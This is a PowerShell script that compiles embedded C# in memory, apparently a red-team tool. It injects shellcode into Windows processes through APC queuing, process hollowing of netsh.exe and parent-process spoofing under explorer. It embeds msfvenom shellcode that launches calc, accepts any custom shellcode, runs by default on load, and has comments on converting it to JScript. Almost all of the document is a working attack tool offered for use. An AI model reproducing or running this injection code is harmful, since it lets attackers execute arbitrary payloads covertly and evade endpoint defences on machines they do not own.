$source = @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace APCManager
{
    [ComVisible(true)]
    public class APCParent
    {
         #region APCParent
        public byte[] Buffer = null;
        public string Path = null;
        public int ID = 0;

        public APCParent()
        {
            // unmanaged x64 binary
            Path = @"C:\windows\system32\netsh.exe";
            // created via: msfvenom -p windows/x64/exec cmd=calc -f ps1
            Buffer = new byte[]{
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00
            };
            // lots of callbacks in explorer
            ID = GetProcessID("explorer");
        }

        public APCParent(string path, byte[] buffer, int parentID)
        {
            Path = path;
            Buffer = buffer;
            ID = parentID;
        }

        public APCParent SetPath(string path)
        {
            Path = path;
            return this;
        }

        public APCParent SetBuffer(string buffer)
        {
            Buffer = Convert.FromBase64String(buffer);
            return this;
        }

        public APCParent SetBuffer(byte[] buffer)
        {
            Buffer = buffer;
            return this;
        }

        public APCParent SetProcess(string name)
        {
            ID = GetProcessID(name);
            return this;
        }

        public int GetProcessID(string name)
        {
            var processes = Process.GetProcessesByName(name);
            return (processes.Length > 0)
            ? processes[0].Id
            : Process.GetProcessesByName("explorer")[0].Id;
        }

        #endregion APCParent

        #region Structs
        #region Shared Structs
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwProcessId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [MarshalAs(UnmanagedType.AsAny)]
            object lpBuffer,
            uint nSize,
            ref uint lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            ref uint lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(
            IntPtr hObject
        );
        #endregion Shared Structs

        #region EmptyProcess Structs
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(
            ref IntPtr section,
            uint desiredAccess,
            IntPtr pAttrs,
            ref LARGE_INTEGER pMaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile
        );

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(
            ref SYSTEM_INFO lpSysInfo
        );

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(
            IntPtr section,
            IntPtr process,
            ref IntPtr baseAddr,
            IntPtr zeroBits,
            IntPtr commitSize,
            IntPtr stuff,
            ref IntPtr viewSize,
            int inheritDispo,
            uint alloctype,
            uint prot
        );

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out]byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            IntPtr nSize,
            out IntPtr lpNumWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(
            IntPtr hThread
        );

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(
            IntPtr hSection,
            IntPtr address
        );

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(
            IntPtr lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcAttribs,
            IntPtr lpThreadAttribs,
            bool bInheritHandles,
            uint dwCreateFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDir,
            [In] ref STARTUPINFO lpStartinfo,
            out PROCESS_INFORMATION lpProcInformation
        );

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        #endregion EmptyProcess Structs

        #region ParentClone Structs
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetHandleInformation(
            IntPtr hObject,
            HANDLE_FLAGS dwMask,
            HANDLE_FLAGS dwFlags
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            uint dwDesiredAccess,
            [MarshalAs(UnmanagedType.Bool)]
        bool bInheritHandle,
            uint dwOptions
        );
        #endregion ParentClone Structs

        #region APCProcess Structs
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(
            THREAD_ACCESS dwDesiredAccess,
            bool bInheritHandle,
            uint dwThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData
        );
        #endregion APCProcess Structs

        #region ParentClone Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        #endregion ParentClone Structs

        #region EmptyProcess Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion EmptyProcess Structs

        #region Flags
        [Flags]
        public enum THREAD_ACCESS : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_CONTROL = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        public enum PROCESS_RIGHTS
        {
            ALL = 0x001F0FFF,
            TERMINATE = 0x00000001,
            CREATE_THREAD = 0x00000002,
            VIRTUAL_MEMORY_OPTION = 0x00000008,
            VIRTUAL_MEMORY_READ = 0x00000010,
            VIRTUAL_MEMORY_WRITE = 0x00000020,
            DUPLICATE_HANDLE = 0x00000040,
            CREATE_PROCESS = 0x000000080,
            SET_QUOTA = 0x00000100,
            SET_INFO = 0x00000200,
            QUERY_INFO = 0x00000400,
            QUERY_LIMITED_INFO = 0x00001000,
            SYNCHRONIZE = 0x00100000
        }

        public enum MEMORY_ALLOCATION
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        public enum MEMORY_PROTECTION
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        public enum MEMORY_OPEN_THREAD_ACCESS
        {
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            SUSPEND_RESUME = 0x0002,
        }

        enum HANDLE_FLAGS : uint
        {
            NONE = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }
        #endregion Flags
        #endregion Structs

        #region EmptyProcess
        [ComVisible(true)]
        public class EmptyProcess
        {
            #region Constants
            public const uint PAGE_PERMISSION_RWX = 0x40;
            public const uint PAGE_PERMISSION_RW = 0x04;
            public const uint PAGE_PERMISSION_RX = 0x20;
            public const uint COMMIT_MEMORY = 0x00001000;
            public const uint COMMIT_SECTION = 0x08000000;
            public const uint GENERIC_ALL = 0x10000000;
            public const uint CREATE_SUSPENDED = 0x00000004;
            public const uint DETACHED_PROC = 0x00000008;
            public const uint CREATE_NO_WINDOW = 0x08000000;
            protected const int ATTR_SIZE = 24;
            private const ulong _PATCH_SIZE = 0x10;
            #endregion Constants
            public IntPtr RemoteSize = IntPtr.Zero;
            public IntPtr PtrModBase = IntPtr.Zero;
            public IntPtr RemoteMap = IntPtr.Zero;
            public IntPtr LocalSize = IntPtr.Zero;
            public IntPtr PtrEntry = IntPtr.Zero;
            public IntPtr LocalMap = IntPtr.Zero;
            public IntPtr Section = IntPtr.Zero;
            public uint RvaEntryOffset = 0;
            public byte[] Inner = null;
            public uint Size = 0;

            public EmptyProcess()
            {
                Section = new IntPtr();
                LocalMap = new IntPtr();
                RemoteMap = new IntPtr();
                LocalSize = new IntPtr();
                RemoteSize = new IntPtr();
                Inner = new byte[0x1000];
            }

            ~EmptyProcess()
            {
                if (LocalMap != (IntPtr)0)
                    ZwUnmapViewOfSection(Section, LocalMap);
            }

            public uint RoundToPage(uint size)
            {
                var info = new SYSTEM_INFO();
                GetSystemInfo(ref info);
                return (info.dwPageSize - size % info.dwPageSize) + size;
            }

            private bool NtSuccess(long value)
            {
                return (value >= 0);
            }

            public IntPtr GetCurrent()
            {
                return GetCurrentProcess();
            }

            public static PROCESS_INFORMATION StartProcess(string binaryPath)
            {
                var flags = CREATE_SUSPENDED;
                var startInfo = new STARTUPINFO();
                var procInfo = new PROCESS_INFORMATION();
                CreateProcess(
                    (IntPtr)0, binaryPath,
                    (IntPtr)0, (IntPtr)0,
                    false, flags,
                    (IntPtr)0, (IntPtr)0,
                    ref startInfo, out procInfo
                );
                LogInfo(
                    string.Format(
                        "[!] Process {0} started with Process ID: {1}.",
                        binaryPath,
                        procInfo.dwProcessId
                    )
                );
                return procInfo;
            }

            public bool CreateSection(uint size)
            {
                var liVal = new LARGE_INTEGER();
                Size = RoundToPage(size);
                liVal.LowPart = Size;
                var status = ZwCreateSection(
                    ref Section, GENERIC_ALL,
                    (IntPtr)0, ref liVal,
                    PAGE_PERMISSION_RWX,
                    COMMIT_SECTION, (IntPtr)0
                );
                LogInfo("[!] Executable section created.");
                return NtSuccess(status);
            }

            public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr address)
            {
                var baseAddr = address;
                var viewSize = (IntPtr)Size;
                var status = ZwMapViewOfSection(
                    Section, procHandle,
                    ref baseAddr, (IntPtr)0,
                    (IntPtr)0, (IntPtr)0,
                    ref viewSize, 1,
                    0, protect
                );
                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
            }

            public void SetLocalSection(uint size)
            {
                var values = MapSection(GetCurrent(), PAGE_PERMISSION_RWX, IntPtr.Zero);
                LogInfo(
                    string.Format("[!] Map view section to the current process: {0}.", values)
                );
                LocalMap = values.Key;
                LocalSize = values.Value;
            }

            public void Copybuffer(byte[] buffer)
            {
                var lSize = Size;
                LogInfo(
                    string.Format("[!] Copying buffer into section: {0}. ", lSize)
                );
                unsafe
                {
                    var pointer = (byte*)LocalMap;
                    for (int i = 0; i < buffer.Length; i++)
                        pointer[i] = buffer[i];
                }
            }

            public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr destination)
            {
                var pointer = Marshal.AllocHGlobal((IntPtr)_PATCH_SIZE);
                var index = 0;
                LogInfo(
                    string.Format(
                        "[!] Preparing buffer patch for the new process entry point: {0}. ",
                        pointer
                    )
                );
                unsafe
                {
                    var bPointer = (byte*)pointer;
                    byte[] buffer = null;

                    if (IntPtr.Size == 4)
                    {
                        bPointer[index] = 0xb8;
                        index++;
                        var value = (Int32)destination;
                        buffer = BitConverter.GetBytes(value);
                    }
                    else
                    {
                        bPointer[index] = 0x48;
                        index++;
                        bPointer[index] = 0xb8;
                        index++;
                        var value = (Int64)destination;
                        buffer = BitConverter.GetBytes(value);
                    }

                    for (int i = 0; i < IntPtr.Size; i++)
                        bPointer[index + i] = buffer[i];

                    index += IntPtr.Size;
                    bPointer[index] = 0xff;
                    index++;
                    bPointer[index] = 0xe0;
                    index++;
                }

                return new KeyValuePair<int, IntPtr>(index, pointer);
            }

            private IntPtr GetEntryFromBuffer(byte[] buffer)
            {
                LogInfo("[!] Locating the entry point for the main module in remote process.");
                var entry = IntPtr.Zero;
                unsafe
                {
                    fixed (byte* pointer = buffer)
                    {
                        var elfaNewOffset = *((uint*)(pointer + 0x3c));
                        var ntHeader = (pointer + elfaNewOffset);
                        var optHeader = (ntHeader + 0x18);
                        var optPointer = *((ushort*)optHeader);
                        var entryPointer = (optHeader + 0x10);
                        var rEntryPointer = *((int*)entryPointer);
                        RvaEntryOffset = (uint)rEntryPointer;
                        entry = (IntPtr)(
                            ((IntPtr.Size == 4)
                                ? PtrModBase.ToInt32()
                                : PtrModBase.ToInt64())
                            + rEntryPointer
                        );
                    }
                }

                PtrEntry = entry;
                return entry;
            }

            public IntPtr FindEntry(IntPtr hProcess)
            {
                var basicInfo = new PROCESS_BASIC_INFORMATION();
                var addrBuffer = new byte[IntPtr.Size];
                var readLoc = IntPtr.Zero;
                var nRead = IntPtr.Zero;
                var retLength = (uint)0;
                var success = ZwQueryInformationProcess(
                    hProcess, 0,
                    ref basicInfo,
                    (uint)(IntPtr.Size * 6),
                    ref retLength
                );

                LogInfo("[!] Locating the module base address in the remote process.");
                readLoc = (IntPtr.Size == 4)
                    ? (IntPtr)((Int32)basicInfo.PebAddress + 8)
                    : (IntPtr)((Int64)basicInfo.PebAddress + 16);

                ReadProcessMemory(hProcess, readLoc, addrBuffer, addrBuffer.Length, out nRead);
                readLoc = (IntPtr.Size == 4)
                    ? (IntPtr)(BitConverter.ToInt32(addrBuffer, 0))
                    : (IntPtr)(BitConverter.ToInt64(addrBuffer, 0));

                PtrModBase = readLoc;
                ReadProcessMemory(hProcess, readLoc, Inner, Inner.Length, out nRead);
                LogInfo(
                    string.Format(
                        "[!] Read the first page and locate the entry point: {0}.",
                        readLoc
                    )
                );
                return GetEntryFromBuffer(Inner);
            }

            public void MapAndStart(PROCESS_INFORMATION pInfo)
            {

                var mSection = MapSection(pInfo.hProcess, PAGE_PERMISSION_RWX, IntPtr.Zero);
                LogInfo(
                    string.Format(
                        "[!] Locate buffer into the suspended remote porcess: {0}.",
                        mSection
                    )
                );
                var tPointer = new IntPtr();
                var tBuffer = new byte[0x1000];
                var nRead = new IntPtr();
                RemoteMap = mSection.Key;
                RemoteSize = mSection.Value;
                var patch = BuildEntryPatch(mSection.Key);

                try
                {
                    var pSize = (IntPtr)patch.Key;
                    WriteProcessMemory(pInfo.hProcess, PtrEntry, patch.Value, pSize, out tPointer);
                }
                finally
                {
                    if (patch.Value != IntPtr.Zero)
                        Marshal.FreeHGlobal(patch.Value);
                }

                ReadProcessMemory(pInfo.hProcess, PtrEntry, tBuffer, 1024, out nRead);
                var resThread = ResumeThread(pInfo.hThread);
                LogSuccess("[+] Process has been resumed.");
            }

            public IntPtr GetBuffer()
            {
                return LocalMap;
            }

            public void Empty(string binary, byte[] buffer)
            {
                var procInfo = StartProcess(binary);
                CreateSection((uint)buffer.Length);
                FindEntry(procInfo.hProcess);
                SetLocalSection((uint)buffer.Length);
                Copybuffer(buffer);
                MapAndStart(procInfo);
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);
            }
        }
        #endregion EmptyProcess

        #region ParentClone
        [ComVisible(true)]
        public class ParentClone
        {
            #region Constants
            public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            public const int STARTF_USESTDHANDLES = 0x00000100;
            public const int STARTF_USESHOWWINDOW = 0x00000001;
            public const uint CREATE_NO_WINDOW = 0x08000000;
            public const uint CREATE_SUSPENDED = 0x00000004;
            public const ushort SW_HIDE = 0x0000;
            #endregion Constants

            public int SearchProcess(string process)
            {
                var session = Process.GetCurrentProcess().SessionId;
                var processes = Process.GetProcessesByName(process);
                var pid = 0;

                try
                {
                    foreach (var proc in processes)
                        if (proc.SessionId == session)
                        {
                            pid = proc.Id;
                            LogInfo(
                                string.Format(
                                    "[!] Parent process ID found: {0}.", pid
                                )
                            );
                        }
                }
                catch (Exception ex)
                {
                    LogError(
                        string.Format(
                            "[-] Error: {0} message: {1}",
                            Marshal.GetExceptionCode(),
                            ex.Message
                        )
                    );
                }
                return pid;
            }

            public PROCESS_INFORMATION GetParentChild(int parentID, string childPath)
            {
                var pInfo = new PROCESS_INFORMATION();
                var sInfoEx = new STARTUPINFOEX();
                var lpValueProc = IntPtr.Zero;
                var hSourceProcessHandle = IntPtr.Zero;
                var lpSize = IntPtr.Zero;
                var pAttributes = new SECURITY_ATTRIBUTES();
                var tAttributes = new SECURITY_ATTRIBUTES();

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                var pHandle = OpenProcess(
                    (uint)PROCESS_RIGHTS.CREATE_PROCESS | (uint)PROCESS_RIGHTS.DUPLICATE_HANDLE,
                    false, (uint)parentID
                );
                LogInfo(
                    string.Format(
                        "[!] Handle {0} opened for parent process id.", pHandle
                    )
                );
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, pHandle);
                UpdateProcThreadAttribute(
                    sInfoEx.lpAttributeList, 0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc, (IntPtr)IntPtr.Size,
                    IntPtr.Zero, IntPtr.Zero
                );

                LogInfo("[!] Adding attributes to a list.");
                sInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                sInfoEx.StartupInfo.wShowWindow = SW_HIDE;
                pAttributes.nLength = Marshal.SizeOf(pAttributes);
                tAttributes.nLength = Marshal.SizeOf(tAttributes);

                try
                {
                    var ProcCreate = CreateProcess(
                        childPath, null, ref pAttributes,
                        ref tAttributes, true,
                        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                        IntPtr.Zero, null,
                        ref sInfoEx, out pInfo
                    );
                    if (!ProcCreate)
                        LogError("[-] Proccess failed to execute!");

                    LogInfo(
                        string.Format(
                            "[!] New suspended process with ID: {0} created under the defined process.",
                            pInfo.dwProcessId
                        )
                    );
                }
                catch (Exception ex)
                {
                    LogError(
                        string.Format(
                            "[-] Error: {0} message: {1}",
                            Marshal.GetExceptionCode(),
                            ex.Message
                        )
                    );
                }
                return pInfo;
            }

            public void CloneParent(string binary, byte[] buffer, int parentID)
            {
                var pInfo = GetParentChild(parentID, binary);
                var procEmpty = new EmptyProcess();
                procEmpty.CreateSection((uint)buffer.Length);
                procEmpty.FindEntry(pInfo.hProcess);
                procEmpty.SetLocalSection((uint)buffer.Length);
                procEmpty.Copybuffer(buffer);
                procEmpty.MapAndStart(pInfo);
                CloseHandle(pInfo.hThread);
                CloseHandle(pInfo.hProcess);
            }
        }
        #endregion ParentClone

        #region CreateAPC
        public APCParent CreateAPC(int pid, int tid)
        {
            try
            {
                var lpNumberOfBytesWritten = (uint)0;
                LogInfo(
                    string.Format(
                        "[!] Obtaining the handle for the process id {0}.", pid
                    )
                );
                var pHandle = OpenProcess((uint)PROCESS_RIGHTS.ALL, false, (uint)pid);
                LogInfo(
                    string.Format(
                        "[!] Handle {0} opened for the process id {1}.",
                        pHandle,
                        pid
                    )
                );

                LogInfo("[!] Allocating memory to write the buffer.");
                var rMemAddress = VirtualAllocEx(
                    pHandle, IntPtr.Zero, (uint)Buffer.Length,
                    (uint)MEMORY_ALLOCATION.MEM_RESERVE | (uint)MEMORY_ALLOCATION.MEM_COMMIT,
                    (uint)MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE
                );
                LogInfo(
                    string.Format(
                        "[!] Memory for writing buffer allocated at 0x{0}.",
                        rMemAddress
                    )
                );

                LogInfo("[!] Writing the buffer at the allocated memory location.");
                if (WriteProcessMemory(
                    pHandle, rMemAddress,
                    Buffer, (uint)Buffer.Length,
                    ref lpNumberOfBytesWritten
                ))
                {
                    LogInfo("[!] buffer written in the process memory.");
                    var tHandle = OpenThread(THREAD_ACCESS.THREAD_ALL, false, (uint)tid);

                    LogInfo(
                        string.Format(
                            "[!] Add the thread {0} to queue for execution when it enters an alertable state.",
                            tHandle
                        )
                    );
                    var pointer = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
                    LogInfo(
                        string.Format(
                            "[!] Resume the thread {0}", tHandle
                        )
                    );
                    ResumeThread(tHandle);
                    LogSuccess(
                        string.Format(
                            "[+] Sucessfully wrote the buffer into the memory of the process id {0}.", pid
                        )
                    );
                }
                else
                    LogError(
                        string.Format(
                            "[-] Failed to write the buffer into the memory of the process id {0}.", pid
                        )
                    );

                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                LogError(
                    string.Format(
                        "[-] Error: {0} message: {1}",
                        Marshal.GetExceptionCode(),
                        ex.Message
                    )
                );
            }
            return this;
        }

        public APCParent CreateParentAPC()
        {
            var parent = new ParentClone();
            var pInfo = parent.GetParentChild(ID, Path);
            CreateAPC(pInfo.dwProcessId, pInfo.dwThreadId);
            return this;
        }
        #endregion CreateAPC

        #region UI
        public static void LogError(string error)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(error);
            Console.ResetColor();
        }

        public static void LogSuccess(string success)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(success);
            Console.ResetColor();
        }
        public static void LogInfo(string info)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine(info);
            Console.ResetColor();
        }

        public static void LogTitle(string title)
        {
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(title);
            Console.ResetColor();
        }
        #endregion UI
        public static void Main(string[] args){}
    }
}
"@
# compiler:
$cp = [codedom.compiler.compilerparameters]::new();
## compile to disk:
#$cp.generateexecutable = $true;
#$cp.generateinmemory = $false;
#$cp.outputassembly = "$pwd\apcmanager.exe";
## /compile to disk

# compile in memory:
$cp.generateinmemory = $true;
# /compile in memory

# compile with unsafe options and references:
$cp.compileroptions = "/unsafe";
$cp.referencedassemblies.addrange((
 "System.Diagnostics.Process.dll",
 "System.Runtime.InteropServices.dll",
 "System.Collections.dll",
 "System.dll"
));

# create custom type and add to domain:
add-type -compilerparameters $cp -typedefinition $source;

# execute with default values:
[apcmanager.apcparent]::new().createparentapc() | out-null;

# load from assembly in memory:
# [reflection.assembly]::load($bytes);

# load from assembly on disk:
# [reflection.assembly]::loadfile("$pwd\apcmanager.exe");

# custom shellcode:
# $shellcode = [byte[]]@(); # msfvenom -p windows/x64/exec cmd=calc -f ps1
# execute in memory with custom parameters:
# [apcmanager.apcparent]::new(
#  "c:\windows\system32\netsh.exe",
#  $shellcode,
#  (get-process explorer)[0].id
# ).createparentapc() | out-null;

# to javascript:
# dotnettojscript.exe -v v4 -d -c "APCManager.APCParent" "$pwd\apcmanager.exe" -o "$pwd\apcmanager.js"
# dotnettojscript.exe -v v4 -d -c "APCManager.APCParent" "$pwd\apcmanager-3.exe" -o "$pwd\apcmanager-3.js"
# local paths:
# c:\users\west\desktop\tools\dotnettojscript\dotnettojscript\bin\debug\
# c:\users\west\desktop\ops\cs_2023\cs2023-opfor\apt1-jackiechan\supportingfiles\execution\
